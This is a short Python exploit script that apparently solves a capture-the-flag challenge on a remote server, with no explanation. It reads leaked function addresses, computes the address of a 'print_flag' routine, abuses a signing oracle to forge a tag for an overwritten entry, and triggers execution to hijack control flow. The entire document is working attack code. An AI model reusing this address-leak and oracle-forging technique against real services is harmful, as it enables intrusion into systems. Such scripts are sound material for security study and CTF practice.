import socket

HOST = "researchlabs.tech"
PORT = 1345

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.5)
sock.connect((HOST, PORT))

f = sock.makefile('rb')

def write(s):
    sock.sendall(s.encode())

def readline():
    return f.readline().decode()

data = readline()
fast_pow_addr = int(data.split(' ')[3], 16)
print_flag_addr = fast_pow_addr + 0x8e
print(hex(print_flag_addr))

readline()
readline()
readline()
data = readline()
malloc_addr = int(data.split(' ')[2], 16)
readline()
readline()
print("entries_set_from_registered", readline())       # choose opt
write('1\n')
print(readline())
write('0\n')
print(readline())
write(str(print_flag_addr) + '\n')

print("sign oracle", readline())       # choose opt
write('0\n')
print(readline())
write(str(0) + '\n')
tag_0 = int(readline().split()[1], 16)

print("entities_set_custom", readline())
write('2\n')
print(readline())
write('0\n')
print(readline())
write(str(print_flag_addr) + '\n')
print(readline())
write(str(tag_0)  + '\n')
print(readline())

print("exec", readline())
write('3\n')
print(readline())
write('0\n')
print(readline())


print(readline())
write('1\n')
print(readline())
write('1\n')
print(readline())

